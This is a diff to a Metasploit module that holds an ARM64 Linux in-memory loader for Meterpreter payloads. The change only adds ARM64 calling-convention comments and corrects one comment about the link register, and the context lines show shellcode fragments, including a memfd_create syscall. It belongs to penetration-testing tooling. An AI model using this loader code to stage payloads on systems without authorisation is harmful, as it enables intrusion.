@@ -4,6 +4,11 @@
 # Author: Martin Sutovsky <martin_sutovsky[at]rapid7.com>
 # Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
 #
+# ARM64 conventions
+# Parameters: x0-x7
+# Syscall offset: x8
+# Return Address for BL: x30
+
 module Msf::Payload::Linux::Aarch64::MeterpreterLoader
   def in_memory_load(payload)
     in_memory_loader = [
@@ -38,7 +43,7 @@ module Msf::Payload::Linux::Aarch64::MeterpreterLoader
       0x282380d2, # 0x1054:	mov	x8, #0x119	0x282380d2
       0x010000d4, # 0x1058:	svc	#0	0x010000d4
 
-      # jump back to 0x1020, the address right after this instruction will be stored in x10
+      # jump back to 0x1020, the address right after this instruction will be stored in x30
       0xf1ffff97, # 0x105c:	bl	#0x1020	0xf1ffff97
     ].pack('N*')
     in_memory_loader + [payload.length].pack('V*')
